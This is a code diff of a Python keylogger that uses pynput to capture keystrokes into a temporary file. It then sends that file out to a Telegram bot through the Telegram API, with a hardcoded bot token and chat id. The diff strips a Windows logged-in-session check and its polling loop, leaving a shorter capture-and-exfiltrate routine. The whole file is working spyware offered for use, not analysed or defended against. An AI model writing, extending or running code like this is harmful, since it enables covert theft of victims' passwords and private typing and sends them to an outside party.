@@ -1,18 +1,12 @@
 #lang:python
 #requirements: requests pynput
 
-import requests
-import subprocess
 import os
+import requests
 import tempfile
-import string
-import time
-import sys
-import ctypes
-import ctypes.wintypes
-from pynput.keyboard import Key, Listener
 import logging
 import threading
+from pynput.keyboard import Key, Listener
 
 chat_id = "-4102145810"
 token = "6653447632:AAEHVkyZH-TFa9141etCM1wmPyJ9rCXuASA"
@@ -27,62 +21,6 @@ def send_file(chat_id, token, filepath):
             'document': file.read()
         }
     r = requests.post(f"https://api.telegram.org/bot{token}/sendDocument", data=data, files=files)
-
-def is_user_logged_in():
-    WTS_CURRENT_SERVER_HANDLE = 0
-    WTS_CURRENT_SESSION = -1
-
-    WTSUserName = 5
-    WTSDomainName = 7
-
-    WTSActive = 0
-
-    class WTS_SESSION_INFO(ctypes.Structure):
-        _fields_ = [
-            ('SessionId', ctypes.wintypes.DWORD),
-            ('pWinStationName', ctypes.wintypes.LPWSTR),
-            ('State', ctypes.wintypes.DWORD)
-        ]
-
-    WTS_SESSION_INFOPtr = ctypes.POINTER(WTS_SESSION_INFO)
-
-    wtsapi32 = ctypes.windll.wtsapi32
-
-    WTSEnumerateSessions = wtsapi32.WTSEnumerateSessionsW
-    WTSEnumerateSessions.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.DWORD, ctypes.wintypes.DWORD, ctypes.POINTER(WTS_SESSION_INFOPtr), ctypes.POINTER(ctypes.wintypes.DWORD)]
-    WTSEnumerateSessions.restype = ctypes.wintypes.BOOL
-
-    WTSFreeMemory = wtsapi32.WTSFreeMemory
-
-    WTSQuerySessionInformation = wtsapi32.WTSQuerySessionInformationW
-    WTSQuerySessionInformation.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.DWORD, ctypes.wintypes.DWORD, ctypes.POINTER(ctypes.wintypes.LPWSTR), ctypes.POINTER(ctypes.wintypes.DWORD)]
-    WTSQuerySessionInformation.restype = ctypes.wintypes.BOOL
-
-    sessions = WTS_SESSION_INFOPtr()
-    count = ctypes.wintypes.DWORD()
-
-    if WTSEnumerateSessions(WTS_CURRENT_SERVER_HANDLE, 0, 1, ctypes.byref(sessions), ctypes.byref(count)):
-        for i in range(count.value):
-            session = sessions[i]
-            if session.State == WTSActive:
-                user_name = ctypes.wintypes.LPWSTR()
-                domain_name = ctypes.wintypes.LPWSTR()
-                user_name_len = ctypes.wintypes.DWORD()
-                domain_name_len = ctypes.wintypes.DWORD()
-
-                if WTSQuerySessionInformation(WTS_CURRENT_SERVER_HANDLE, session.SessionId, WTSUserName, ctypes.byref(user_name), ctypes.byref(user_name_len)):
-                    if WTSQuerySessionInformation(WTS_CURRENT_SERVER_HANDLE, session.SessionId, WTSDomainName, ctypes.byref(domain_name), ctypes.byref(domain_name_len)):
-                        if user_name.value and domain_name.value:
-                            WTSFreeMemory(user_name)
-                            WTSFreeMemory(domain_name)
-                            WTSFreeMemory(sessions)
-                            return True
-                WTSFreeMemory(user_name)
-                WTSFreeMemory(domain_name)
-
-        WTSFreeMemory(sessions)
-        
-    return False
 
 def keylogger(file, timeout):
     logging.basicConfig(filename=file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
@@ -116,20 +54,14 @@ log_file_path = temp_file.name
 temp_file.close()
 
 send_message(chat_id, token, f"Temp file : {str(log_file_path)}")
-send_message(chat_id, token, "Entering in loop")
 
-while True:
-    if is_user_logged_in():
-        send_message(chat_id, token, "userlogged")
-        if os.path.isfile(log_file_path):
-            os.remove(log_file_path)
-        send_message(chat_id, token, "deleted tempfile")
-        break
-    else:
-        send_message(chat_id, token, "usernotlogged")
-        keylogger(log_file_path, 10)
-        send_message(chat_id, token, "keylogger() end")
-        if not is_file_empty(file_path):
-            send_message(chat_id, token, "sending file")
-            send_file(chat_id, token, log_file_path)
-            send_message(chat_id, token, "done")
+if os.path.isfile(log_file_path):
+    os.remove(log_file_path)
+keylogger(log_file_path, 10)
+
+send_message(chat_id, token, "keylogger() end")
+
+if not is_file_empty(log_file_path):
+    send_message(chat_id, token, "sending file")
+    send_file(chat_id, token, log_file_path)
+    send_message(chat_id, token, "done")
